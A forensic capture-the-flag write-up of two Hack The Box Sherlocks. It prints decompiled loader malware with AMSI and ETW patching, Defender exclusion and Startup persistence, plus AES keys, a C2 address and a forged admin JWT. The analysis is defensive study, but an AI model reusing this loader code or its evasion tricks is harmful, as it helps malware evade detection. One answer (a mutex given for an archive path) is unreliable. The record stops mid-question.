> Link HTB #2.1: https://hackmd.io/@bMGaKJbHSWqauGaKAUyYhA/rkRi7jwWGl

### XII. Kraken:
> - Link lab: https://app.hackthebox.com/sherlocks/Kraken?tab=play_sherlock
> - Đề bài:
![image](https://hackmd.io/_uploads/SJvZTlmKzg.png)

#### 1. What was the exact date and time the malicious file was executed by the user?
Using FTK Imager for this challenge, export `NTUSER.DAT` and analyse this file by Registry Expolorer:
![image](https://hackmd.io/_uploads/ByhB7Q4FMg.png)
`NTUSER.DAT\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\` includes the information about executed process:
![image](https://hackmd.io/_uploads/SkLd8mVYMx.png)
I think `wscript.exe` and `Ghost Toolbox` is so supscious, in this challenge, `wscript.exe` is the correct answer.

**Answer:** `2025-06-13 14:43:27`

#### 2. During the initial stage of execution, what is the name of the first file dropped by the malicious file?
When checking for `AppData\Local\Temp`:
![image](https://hackmd.io/_uploads/ryqGP44FGx.png)
It is a intermediate script file. The date created of this file is `2025-06-13 14:43:28`.

**Answer:** `temp_993805.bat`

#### 3. During the initial stage of execution, The malicious file performed in-memory patching of a critical security function by overwriting it with a 6-byte sequence that forces the function to return zero. What is this hexadecimal byte sequence?
- Export `temp_993805.bat` and read its content:
![image](https://hackmd.io/_uploads/rkYX5VNFMe.png)
This is an obfuscated script, run this below code to defuscate the `.bat` file: 
    ``` py
    import re
    import sys
    import base64
    import argparse
    from pathlib import Path

    WINDOWS_BUILTIN_VARS = {
        "userprofile", "appdata", "localappdata", "temp", "tmp", "windir",
        "systemroot", "systemdrive", "programdata", "programfiles",
        "programfiles(x86)", "path", "pathext", "computername", "username",
        "homedrive", "homepath", "public", "allusersprofile", "comspec",
        "processor_architecture", "os", "number_of_processors",
    }

    VAR_PATTERN = re.compile(r"%([a-zA-Z_][a-zA-Z0-9_]*)%")
    DELAYED_VAR_PATTERN = re.compile(r"!([a-zA-Z_][a-zA-Z0-9_]*)!")
    SET_PATTERN = re.compile(
        r'^\s*set\s+(?:"([a-zA-Z_][a-zA-Z0-9_]*)=([^"]*)"|([a-zA-Z_][a-zA-Z0-9_]*)=(.*))\s*$',
        re.IGNORECASE,
    )
    BASE64_BLOCK_PATTERN = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")

    DANGEROUS_COMMANDS = {
        r"\biex\b": "REM-DEFANGED-iex",
        r"\bInvoke-Expression\b": "REM-DEFANGED-Invoke-Expression",
        r"\bstart\s+/min\b": "REM-DEFANGED-start-min",
        r"\bcmd(\.exe)?\s*/c\b": "REM-DEFANGED-cmd-slash-c",
        r"\bpowershell(\.exe)?\b": "REM-DEFANGED-powershell",
    }

    def strip_junk_variables(text):
        defined_vars = {m.group(1) or m.group(3) for m in SET_PATTERN.finditer(text) if (m.group(1) or m.group(3))}
        defined_vars = {v.lower() for v in defined_vars}

        def repl(m):
            name = m.group(1)
            low = name.lower()
            if low in WINDOWS_BUILTIN_VARS or low in defined_vars: return m.group(0)
            return ""
        return VAR_PATTERN.sub(repl, text)

    def build_variable_map(text):
        var_map = {}
        for line in text.splitlines():
            m = SET_PATTERN.match(line)
            if m:
                key = (m.group(1) or m.group(3)).strip()
                val = (m.group(2) if m.group(1) else m.group(4)) or ""
                val = val.strip()
                var_map[key.lower()] = val
        return var_map

    def resolve_variables(text, var_map, max_passes=10):
        def repl_percent(m):
            key = m.group(1).lower()
            return var_map.get(key, m.group(0))

        def repl_bang(m):
            key = m.group(1).lower()
            return var_map.get(key, m.group(0))

        for _ in range(max_passes):
            new_text = VAR_PATTERN.sub(repl_percent, text)
            new_text = DELAYED_VAR_PATTERN.sub(repl_bang, new_text)
            if new_text == text: break
            text = new_text
        return text

    def try_base64_decode(candidate):
        padded = candidate + "=" * (-len(candidate) % 4)
        try: decoded_bytes = base64.b64decode(padded, validate=False)
        except Exception: return None

        for encoding in ("utf-16-le", "utf-8"):
            try:
                decoded = decoded_bytes.decode(encoding)
                printable = sum(c.isprintable() or c in "\r\n\t" for c in decoded)
                if len(decoded) > 0 and printable / len(decoded) > 0.85: return decoded
            except Exception: continue
        return None

    def extract_and_decode_payloads(text, depth=0, max_depth=5):
        results = []
        if depth >= max_depth: return results
        for match in BASE64_BLOCK_PATTERN.finditer(text):
            candidate = match.group(0)
            decoded = try_base64_decode(candidate)
            if decoded:
                results.append(decoded)
                results.extend(extract_and_decode_payloads(decoded, depth + 1, max_depth))
        return results

    def defang(text):
        for pattern, replacement in DANGEROUS_COMMANDS.items(): text = re.sub(pattern, replacement, text, flags=re.IGNORECASE)
        return text

    def deobfuscate(file_path):
        raw = file_path.read_text(encoding="utf-8", errors="ignore")

        stripped = strip_junk_variables(raw)
        var_map = build_variable_map(stripped)
        resolved = resolve_variables(stripped, var_map)
        payloads = extract_and_decode_payloads(resolved)

        final_readable = defang(resolved + "\n" + "\n".join(payloads))
        return final_readable

    def main():
        parser = argparse.ArgumentParser()
        parser.add_argument("input_file")
        parser.add_argument("-o", "--output")
        args = parser.parse_args()

        in_path = Path(args.input_file)
        if not in_path.exists():
            print(f"[LỖI] Không tìm thấy file: {in_path}", file=sys.stderr)
            sys.exit(1)

        out_path = Path(args.output) if args.output else in_path.with_name(in_path.stem + "_final.txt")

        result = deobfuscate(in_path)
        out_path.write_text(result, encoding="utf-8")

        print(out_path)

    if __name__ == "__main__": main()
    ```
- In deobfucated script:
![image](https://hackmd.io/_uploads/HJRFOH4KGl.png)
These bytes is Assembly code x86/x64:
    - `B8 00 00 00 00`: `mov eax, 0`
    - `C3`: `ret`
The script edits malware-scanning function to a function that always return `0` (similar to error code `AMSI_RESULT_CLEAN`). No matter how dangerous the payload is, AMSI always reports to Defender that it is safe.

**Answer:** `0xB8,0x0,0x00,0x00,0x00,0xC3`

#### 4. What is the name of the file responsible for dropping the second-stage PE Files? (2nd Stage)
In the first part of the script:
![image](https://hackmd.io/_uploads/S1Cp5KSKfg.png)
![image](https://hackmd.io/_uploads/ryg5zjYrtfl.png)

**Answer:** `dwm.bat`

#### 5. What is the SHA-1 hash of the PE file created during the infection process, not malicious on its own?
- Because `temp_993805.bat` was runned in PowerShell, try extracting `Microsoft-Windows-PowerShell%4Operational.evtx` to find some clues:
![image](https://hackmd.io/_uploads/Hy3cPtSYfg.png)
- We saw this malicious payload:
![image](https://hackmd.io/_uploads/rJFpvKHYfl.png)
    ``` c++
    $lywyupnniwjnwvw = $env:USERNAME;
    $xmjclwpvfnogfdf = "C:\Users\$lywyupnniwjnwvw\dwm.bat";

    if (Test-Path $xmjclwpvfnogfdf) {
        Write-Host "Batch file found: $xmjclwpvfnogfdf" -ForegroundColor Cyan;    
        $fileLines = [System.IO.File]::ReadAllLines($xmjclwpvfnogfdf, [System.Text.Encoding]::UTF8);    

        foreach ($line in $fileLines) {        
            if ($line -match '^::: ?(.+)$') {            
                Write-Host "Injection code detected in the batch file." -ForegroundColor Cyan;  

                try {                
                    $decodedBytes = [System.Convert]::FromBase64String($matches[1].Trim());                
                    $injectionCode = [System.Text.Encoding]::Unicode.GetString($decodedBytes);                
                    Write-Host "Injection code decoded successfully." -ForegroundColor Green;                
                    Write-Host "Executing injection code..." -ForegroundColor Yellow;                
                    Invoke-Expression $injectionCode;                
                    break;
                }             
                catch {
                    Write-Host "Error during decoding or executing injection code: $_" -ForegroundColor Red;
                };        
            };    
        };
    }

    else {      
        Write-Host "System Error: Batch file not found: $xmjclwpvfnogfdf" -ForegroundColor Red;    
        exit;
    };

    function gbpqucxrcfxcqcc($param_var) {	
        $aes_var=[System.Security.Cryptography.Aes]::Create();	
        $aes_var.Mode=[System.Security.Cryptography.CipherMode]::CBC;	
        $aes_var.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;	
        $aes_var.Key=[System.Convert]::FromBase64String('ImocNEnUZbHBmaXIBtoy7X3HCr9QsCDJAUlkq43qYFg=');	
        $aes_var.IV=[System.Convert]::FromBase64String('WCpQVGqc+E4SNHfKYV5jVQ==');	
        $decryptor_var=$aes_var.CreateDecryptor();	
        $return_var=$decryptor_var.TransformFinalBlock($param_var, 0, $param_var.Length);	
        $decryptor_var.Dispose();	
        $aes_var.Dispose();	
        $return_var;
    }

    function moegszljbtuuqty($param_var) {	
        $ktumygjgvoympdu=New-Object System.IO.MemoryStream(,$param_var);	
        $gbnacpxhbjvsoxa=New-Object System.IO.MemoryStream;	
        $hgxevehdevdhjst=New-Object System.IO.Compression.GZipStream($ktumygjgvoympdu, [IO.Compression.CompressionMode]::Decompress);	
        $hgxevehdevdhjst.CopyTo($gbnacpxhbjvsoxa);	
        $hgxevehdevdhjst.Dispose();	
        $ktumygjgvoympdu.Dispose();	
        $gbnacpxhbjvsoxa.Dispose();	
        $gbnacpxhbjvsoxa.ToArray();
    }

    function verjrjrqdodbnti($param_var,$param2_var) {	
        $nwfhmshprjnltdd=[System.Reflection.Assembly]::('daoL'[-1..-4] -join '')([byte[]]$param_var);	
        $nuiugsoliqzxjfz=$nwfhmshprjnltdd.EntryPoint;	
        $nuiugsoliqzxjfz.Invoke($null, $param2_var);
    }

    $host.UI.RawUI.WindowTitle = $xmjclwpvfnogfdf;
    $wfdeypelsakoqbr=[System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')($xmjclwpvfnogfdf).Split([Environment]::NewLine);
    foreach ($iztnbpjgjpisvip in $wfdeypelsakoqbr) {	
        if ($iztnbpjgjpisvip.StartsWith(':: ')) {		
            $wxjuawmvyltbrba=$iztnbpjgjpisvip.Substring(3);		
            break;	
        }
    }

    $owlhnktitgnqaer=[string[]]$wxjuawmvyltbrba.Split('\');
    $eqmijlluxoedssc=moegszljbtuuqty (gbpqucxrcfxcqcc ([Convert]::FromBase64String($owlhnktitgnqaer[0])));
    $lktibmgovfhzxpq=moegszljbtuuqty (gbpqucxrcfxcqcc ([Convert]::FromBase64String($owlhnktitgnqaer[1])));
    verjrjrqdodbnti $eqmijlluxoedssc $null;
    verjrjrqdodbnti $lktibmgovfhzxpq (,[string[]] ('%*'));
    ```
    The above script will find and run lines starting with `:::` in `C:\Users\<username>\dwm.bat`. After running the hidden code, two PE files will be extracted (`$eqmijlluxoedssc`, `$lktibmgovfhzxpq`. One of the two files is clean, the rest file is malicious. Both of them is decoded by using AES-CBC and extract with GZip, then they are executed in memory.
- Rewrite the script to extract PE files and shed the file-executing:
    ``` py
    import base64
    import gzip
    import os
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.backends import default_backend

    BATCH_FILE_PATH = r"C:\Users\Ha Nguyen\Desktop\CTF\Kraken\dwm.bat"
    OUTPUT_DIR = r"C:\Users\Ha Nguyen\Desktop\CTF\Kraken" 

    AES_KEY = base64.b64decode("ImocNEnUZbHBmaXIBtoy7X3HCr9QsCDJAUlkq43qYFg=")
    AES_IV = base64.b64decode("WCpQVGqc+E4SNHfKYV5jVQ==")

    def decrypt_aes(data: bytes) -> bytes:
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(data) + decryptor.finalize()
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        decrypted_data = unpadder.update(decrypted_padded) + unpadder.finalize()
        return decrypted_data

    def decompress_gzip(data: bytes) -> bytes: return gzip.decompress(data)

    def main():
        if not os.path.exists(BATCH_FILE_PATH): return

        payload_line = ""
        with open(BATCH_FILE_PATH, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                if line.startswith(":: "):
                    payload_line = line[3:].strip()
                    break
    
        if not payload_line: return

        payloads = payload_line.split('\\')
        if len(payloads) != 2: return

        for index, b64_payload in enumerate(payloads):
            file_id = index + 1
            output_file = os.path.join(OUTPUT_DIR, f"payload{file_id}.exe")
        
            try:
                enc_bytes = base64.b64decode(b64_payload)
                dec_bytes = decrypt_aes(enc_bytes)
                pe_bytes = decompress_gzip(dec_bytes)
                with open(output_file, 'wb') as f: f.write(pe_bytes)
                print(output_file)
            
            except Exception as e: print(f"{file_id}: {e}")

    if __name__ == "__main__": main()
    ```
    ![image](https://hackmd.io/_uploads/HJChcXuKGg.png)
- Check the hash of these extract file:
    - `payload1.exe`:
    ![image](https://hackmd.io/_uploads/Sy68omdYfe.png)
    ![image](https://hackmd.io/_uploads/BkS4iQ_YGe.png)
    - `payload2.exe`:
    ![image](https://hackmd.io/_uploads/rkGj37_Yzg.png)
    ![image](https://hackmd.io/_uploads/Skbnhm_Ffl.png)
Maybe the malicious file is `payload2.exe`.

**Answer:** `339E27243DF24F2B8979E78711E396698F4F47CC`


#### 6. In the third stage, what is the name of the malicious encrypted file that is injected into memory?
Using ILSpy to read the script of `payload2.exe`:
``` c#
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;

internal class ymhpfvjydiynirikxkjbhjxgo
{
	private static uint PAGE_EXECUTE_READWRITE = 64u;

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string lpFileName);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	[DllImport("kernel32.dll")]
	private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

	private static void Main(string[] args)
	{
		try
		{
			if (!isstartup_function_name(Console.Title))
			{
				installstartup_function_name(Console.Title);
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show("Erro no Startup: " + ex.ToString());
			Process.GetCurrentProcess().Kill();
		}
		if (isadmin_function_name())
		{
			try
			{
				AddDefenderExclusionWMI("C:\\");
			}
			catch (Exception)
			{
			}
		}
		IntPtr hModule = LoadLibrary("ntdll.dll");
		IntPtr procAddress = GetProcAddress(hModule, "EtwEventWrite");
		byte[] array = ((IntPtr.Size == 8) ? new byte[1] { 195 } : new byte[3] { 194, 20, 0 });
		VirtualProtect(procAddress, (UIntPtr)(ulong)array.Length, PAGE_EXECUTE_READWRITE, out var lpflOldProtect);
		Marshal.Copy(array, 0, procAddress, array.Length);
		VirtualProtect(procAddress, (UIntPtr)(ulong)array.Length, lpflOldProtect, out lpflOldProtect);
		string text = "xxxxxxxxxxxxxxxxxxxxxxxxxxxx.exe";
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
		foreach (string name in manifestResourceNames)
		{
			if (name == text || string.IsNullOrWhiteSpace(name) || (!name.EndsWith(".exe") && !name.EndsWith(".bat")))
			{
				continue;
			}
			try
			{
				File.WriteAllBytes(name, vrqddcyydhiirynxuyehnfyxf(name));
				File.SetAttributes(name, FileAttributes.Hidden | FileAttributes.System);
				new Thread((ThreadStart)delegate
				{
					Process.Start(name).WaitForExit();
					File.SetAttributes(name, FileAttributes.Normal);
					File.Delete(name);
				}).Start();
			}
			catch
			{
			}
		}
		byte[] rawAssembly = crsfrooabjsbguiyqspwoxwjl(wchsjzawpcmvznzpmsgdltejp(vrqddcyydhiirynxuyehnfyxf(text), Convert.FromBase64String("ALWIGeOnxudniHR2K4CNZmnaEZffXt6zKsRFoAM2/mA="), Convert.FromBase64String("JXYbOTuuz3cErOl30kAKhw==")));
		string[] array2 = new string[0];
		try
		{
			array2 = ((args.Length > 0) ? args[0].Split(' ') : new string[0]);
		}
		catch
		{
		}
		MethodInfo entryPoint = Assembly.Load(rawAssembly).EntryPoint;
		try
		{
			entryPoint.Invoke(null, new object[1] { array2 });
		}
		catch
		{
			entryPoint.Invoke(null, null);
		}
	}

	private static bool isstartup_function_name(string path)
	{
		return path.Contains(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
	}

	private static void installstartup_function_name(string batPath)
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
			if (!Directory.Exists(folderPath))
			{
				Directory.CreateDirectory(folderPath);
			}
			string path = $"{Guid.NewGuid().ToString().Substring(0, 4)}.bat";
			string text = Path.Combine(folderPath, path);
			if (!string.Equals(Path.GetFullPath(batPath), Path.GetFullPath(text), StringComparison.OrdinalIgnoreCase))
			{
				File.Copy(batPath, text, overwrite: true);
				Console.WriteLine("  Location: " + text);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("  " + ex.Message);
		}
	}

	private static bool isadmin_function_name()
	{
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	private static void killnonelevatedbatinstances_function_name(string batPath)
	{
		try
		{
			string text = batPath.Replace("\\", "\\\\");
			string queryString = "SELECT ProcessId, CommandLine FROM Win32_Process WHERE CommandLine LIKE '%" + text + "%'";
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString);
			foreach (ManagementObject item in managementObjectSearcher.Get())
			{
				uint num = (uint)item["ProcessId"];
				try
				{
					Process processById = Process.GetProcessById((int)num);
					processById.Kill();
					Console.WriteLine("Closing: " + num);
				}
				catch
				{
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error with: " + ex.Message);
		}
	}

	public static void AddDefenderExclusionWMI(string path)
	{
		ManagementScope managementScope = new ManagementScope("\\\\.\\root\\Microsoft\\Windows\\Defender");
		managementScope.Connect();
		ManagementClass managementClass = new ManagementClass(managementScope, new ManagementPath("MSFT_MpPreference"), null);
		ManagementBaseObject methodParameters = managementClass.GetMethodParameters("Add");
		methodParameters["ExclusionPath"] = new string[1] { path };
		managementClass.InvokeMethod("Add", methodParameters, null);
	}

	private static byte[] wchsjzawpcmvznzpmsgdltejp(byte[] input, byte[] key, byte[] iv)
	{
		using AesManaged aesManaged = new AesManaged();
		aesManaged.Mode = CipherMode.CBC;
		aesManaged.Padding = PaddingMode.PKCS7;
		ICryptoTransform cryptoTransform = aesManaged.CreateDecryptor(key, iv);
		return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
	}

	private static byte[] crsfrooabjsbguiyqspwoxwjl(byte[] bytes)
	{
		using MemoryStream stream = new MemoryStream(bytes);
		using MemoryStream memoryStream = new MemoryStream();
		using (GZipStream gZipStream = new GZipStream(stream, CompressionMode.Decompress))
		{
			gZipStream.CopyTo(memoryStream);
		}
		return memoryStream.ToArray();
	}

	private static byte[] vrqddcyydhiirynxuyehnfyxf(string name)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		using MemoryStream memoryStream = new MemoryStream();
		using (Stream stream = executingAssembly.GetManifestResourceStream(name))
		{
			stream.CopyTo(memoryStream);
		}
		return memoryStream.ToArray();
	}
}
```
The above .NET Dropper/Loader script used to maintain and destroy the system and continue to add another malicious script to the memory:
- Firstly, it checks whether it is running from `AppData` folder, if not, it copies itself, as a `.bat` file, to `Startup` folder. After that, Windows Defender is turned off by WMI (`AddDefenderExclusionWMI`). If the malware runs as an administrator, WMI is called to turn `C:\` into exclusion folder. Consequently, Windows Defender is "blind" because it cannot scan any files in `C:\`. This technique is similar to memory-patching in stage 1.
- In the next step, it runs `for` loop to scan all the resources embedded in this `payload2.exe`. If there has any `.exe` or `.bat` file (but `xxxxxxxxxxxxxxxxxxxxxxxxxxxx.exe`), they are set to be hidden and after being running, they are automatically deleted to wipe all traces.
- Similar to the previous PowerShell script, this malware hides the last PE file in `xxxxxxxxxxxxxxxxxxxxxxxxxxxx.exe`. It calls `wchsjzawpcmvznzpmsgdltejp` function to decode this resources with other new key and IV. After being extracted by GZip, it runs `Assembly.Load(rawAssembly).EntryPoint.Invoke(...)` to add and activate the malicious script directly in the memory of current process.
- Finally, a file is dropped to `Startup` folder (because of the API `Environment.SpecialFolder.Startup`).

![image](https://hackmd.io/_uploads/BJZ4gE_YMl.png)

**Answer:** `xxxxxxxxxxxxxxxxxxxxxxxxxxxx.exe`

#### 7. What encryption key and initialization vector (IV) were used to decrypt the file prior to memory injection?
In the above script of `payload2.exe`:
![image](https://hackmd.io/_uploads/BJwTrNuKze.png)

**Answer:** `ALWIGeOnxudniHR2K4CNZmnaEZffXt6zKsRFoAM2/mA=,JXYbOTuuz3cErOl30kAKhw==`

#### 8. What is the SHA-1 hash of that file after decryption?
- Extract `xxxxxxxxxxxxxxxxxxxxxxxxxxxx.exe` and save as `encrypted_resource.bin`:
![image](https://hackmd.io/_uploads/BJKU1ruKMl.png)
![image](https://hackmd.io/_uploads/BJIcyS_tGg.png)
- Run the below code to extract the last PE file:
    ``` py
    import base64
    import gzip
    import os
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.backends import default_backend

    INPUT_FILE = r"C:\Users\Ha Nguyen\Desktop\CTF\Kraken\encrypted_resource.bin"
    OUTPUT_FILE = r"C:\Users\Ha Nguyen\Desktop\CTF\Kraken\payload3.exe"
    AES_KEY = base64.b64decode("ALWIGeOnxudniHR2K4CNZmnaEZffXt6zKsRFoAM2/mA=")
    AES_IV = base64.b64decode("JXYbOTuuz3cErOl30kAKhw==")

    def decrypt_aes(data: bytes) -> bytes:
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(data) + decryptor.finalize()
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        decrypted_data = unpadder.update(decrypted_padded) + unpadder.finalize()
        return decrypted_data

    def main():
        if not os.path.exists(INPUT_FILE): return

        try:
            with open(INPUT_FILE, 'rb') as f: encrypted_data = f.read()
            decrypted_data = decrypt_aes(encrypted_data)
            final_pe_data = gzip.decompress(decrypted_data)
            with open(OUTPUT_FILE, 'wb') as f: f.write(final_pe_data)
        
        except Exception as e: print(e)

    if __name__ == "__main__": main()
    ```
- Check for the hash of extracted file:
![image](https://hackmd.io/_uploads/Bk3QZS_YGx.png)
![image](https://hackmd.io/_uploads/Hyp8bHdFze.png)

**Answer:** `052C0687F023564A3C31FB652BEA3405341272CB`

#### 9. There are 3 user agent strings in that PE File, what is the one related to the Mobile Device?
Using ILSpy to analyse `payload3.exe`, in class `Concentrate`:
![image](https://hackmd.io/_uploads/S14DktYtGl.png)
The whole line is:
``` c#
private static readonly string[] Parenting = new string[3] { "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" };
```
**Answer:** `Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1`

#### 10. Once the attacker gained root access on the system, they began preparing for data exfiltration. Data was staged and compressed before being exfiltrated outside the network. What is the full path of the archive file?
Using `Ctrl` + `F` to find the keyword `mutex`, in class `Concentrate`:
![image](https://hackmd.io/_uploads/rJe0WYFYGg.png)
And in class `Louisiana`:
![image](https://hackmd.io/_uploads/Bk0z4YFtMl.png)
As we can see:
- `new Mutex()` is the function to create a new Mutex objective.
- `Louisiana.Territories =` is the Mutex objective that is created and stored into `Territories` variable (this variable belongs to class `Louisiana`).
- `public static Mutex Territories`: This is the official statement to confirm that `Territories` is a variable having data type `Mutex`.

**Answer:** `Territories`

#### 11. What is the ip address and port number that C2 file connects to during that time?
- In class `Concentrate`:
![image](https://hackmd.io/_uploads/rkFZDFFtfe.png)
The IP address or C2 Domain name is store in `Incorporate` variable and the port number is stored in `Contributing` variable.
- Filter the keyword `Incorporate`, in class `Characterized`:
![image](https://hackmd.io/_uploads/BkOVuKKKGg.png)
So we have to look for `array[1]` and `array[2]`.
- In the same class, I see this line:
![image](https://hackmd.io/_uploads/SknfFtKFMl.png)
    - `Concentrate.Mauritius(Configured)`: Pass `Configured` variable to function `Mauritius` to decrypt.
    - `Concentrate.Instrumental()`: Transfer the decrypted byte array to a readable string.
    - `Strings.Split(..., Conversions.ToString(Negotiations))`: Divide the above long configuration string into smaller parts and pass to `array`.
- When I trace all the things that related to `array`, I find that all of them point to class `Louisiana`. In this class:
![image](https://hackmd.io/_uploads/ryY32KtYGe.png)
The domain is `apostlejob3.duckdns.org` and its port is `2468`.
- Search for this domain on NsLookup.io:
![image](https://hackmd.io/_uploads/rkbVAtKKfx.png)
The IP address is `107.172.232.84`.

**Answer:** `107.172.232.84:2468`

#### 12. A persistence file was dropped to maintain access for the attacker. What is the full path of this file?
In the third stage, we have `installstartup_function_name` function in the script of `payload2.exe`:
![image](https://hackmd.io/_uploads/HJm1-9tKMe.png)
We all know that the dropped file is in `Startup` folder. Go to this folder:
![image](https://hackmd.io/_uploads/B1U8M9FFfx.png)

**Answer:** `C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\5c74.bat`

### XIII. ReachKart:
> - Link lab: https://app.hackthebox.com/sherlocks/ReachKart?tab=play_sherlock
> - Đề bài:
> ![image](https://hackmd.io/_uploads/BJVy-hIqzl.png)

#### 1. What was the vulnerable endpoint that allowed the attacker to leak files?
In `access.log`, I saw a sign of Path Traversal:
![image](https://hackmd.io/_uploads/SypIG28cMl.png)
It came from `/user/getOrderBill` endpoint.

**Answer:** `/user/getOrderBill`

#### 2. When was the first successful exploitation of the vulnerable endpoint by the attacker (time in UTC)?
I saw that server reply a respond whose code is `200 OK`:
![image](https://hackmd.io/_uploads/SJfHwnLqMl.png)

**Answer:** `2025-03-01 04:09:22`

#### 3. Which version of Express is currently being used on the server?
In `.pcap`, filter packets whose protocol is HTTP. There has a packet that attacker successfully exploit to `package.json`:
![image](https://hackmd.io/_uploads/SJ-HF2I5Mx.png)
Check its HTTP Stream:
![image](https://hackmd.io/_uploads/ryGvK385ze.png)

**Answer:** `4.21.2`

#### 4. Which Ethereum compatible development smart contract network is running on the server? (Format: name@version)
In `package.json`:
![image](https://hackmd.io/_uploads/SyLKlgO5fg.png)

**Answer:** `hardhat@2.22.18`

#### 5. What is the signing key used by the server to sign JSON Web Tokens (JWT)?
- Check for the following packet:
![image](https://hackmd.io/_uploads/rkFDfl_qMx.png)
I saw this line:
![image](https://hackmd.io/_uploads/ryG2Mxu9fx.png)
The key was read from `reachkart.key`. But when finding this file to export, I saw nothing:
![image](https://hackmd.io/_uploads/SkIvQld9Gg.png)
![image](https://hackmd.io/_uploads/BJyW7xuqze.png)
- Try to check HTTP Stream of the next packet:
![image](https://hackmd.io/_uploads/H17nQxucGx.png)
I saw this:
![image](https://hackmd.io/_uploads/BJA0Xgu9fg.png)
This line means that if there has a `SECRET_KEY` set on the system, use it. If not, use `SuperSecretPassword`.

**Answer:** `SuperSecretPassword`


#### 6. The attacker was able to generate a JWT from the signing key and log in to the admin panel. What is the JWT value?
Because attacker logged into the admin panel, check for HTTP Stream of this packet:
![image](https://hackmd.io/_uploads/rJ4JUxdcGg.png)
I saw this token:
![image](https://hackmd.io/_uploads/HJxLUxd5Gg.png)
Attacker successfully logged into `/admin/home`.

**Answer:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiRGFydGggVmFkZXIiLCJlbWFpbCI6ImRhcnRodmFkZXJAZW1waXJlLmNvbSIsImFjY291bnRfdHlwZSI6ImFkbWluIiwiaWF0IjoxNzQwODAyNzM0LCJleHAiOjE3NDA4ODkxMzR9.RBmMEC7IYmkzz1LsT-kP_JkLCUb7-hsJKX4IdjE91TE
```

#### 7. Decode the token and find the email used by the attacker to log in to the admin panel.
Go back to this packet and check for its HTTP Stream:
![image](https://hackmd.io/_uploads/r1tCYe_cMe.png)
There has a function used to generate a JWT Token:
![image](https://hackmd.io/_uploads/BkqWixd9zl.png)
Export `reachkart.db` and check for this database:
![image](https://hackmd.io/_uploads/SJnLTxdqMg.png)
![image](https://hackmd.io/_uploads/HkpOTeO9fl.png)
Check the `user` table:
![image](https://hackmd.io/_uploads/S1Yp6gdcfl.png)
I don't know how to get the email from a token, but I found this link: https://jwt.io. So, copy the above token past to this URL:
![image](https://hackmd.io/_uploads/SkY90x_qMx.png)
And I get the attacker's email.

**Answer:** `darthvader@empire.com`

#### 8. The admin panel uses WebSocket to send and receive terminal input. What port is being used?
We know that attacker successfully logged to Admin Panel:
![image](https://hackmd.io/_uploads/SJiGWW_5Mx.png)
Check for the HTTP Stream of the packet no. 1288:
![image](https://hackmd.io/_uploads/S1oIWWuqfg.png)

**Answer:** `8888`

#### 9. The attacker then was able to retrieve a sensitive file. When did the attacker get the file (UTC)?
Check for the flow of HTTP packets:
![image](https://hackmd.io/_uploads/rJj7GW_qGx.png)
After send and receive terminal input, attacker tried getting some files in `/log`, but failed. Then, attacker successfully get a database file, it is `reachkart.db` that I exported before.

**Answer:** `2025-03-01 04:22:01`

#### 10. What is the SHA-256 hash of the file that the attacker downloaded?
Check for its SHA-256 hash in PowerShell:
![image](https://hackmd.io/_uploads/BJgrmZucfx.png)

**Answer:** `fabe3234bb709ee5e5c5c2789c891a9a49368ffa520b23d60f6be2f2ca81bac6`

#### 11. How many sellers are there in the e-commerce website?
I will do a query to find the number of sellers in `users` table:
![image](https://hackmd.io/_uploads/B1y-E-O5fl.png)
![image](https://hackmd.io/_uploads/BJR7EZOcGg.png)
There are eight sellers.

**Answer:** `8`

#### 12. The attacker started sending Ether from all identified sellers' wallets. What is the hash of the first transaction?
- In `rk-sever.js`, we can check the function related to behave transactions:
![image](https://hackmd.io/_uploads/ryNjiqu9Mx.png)
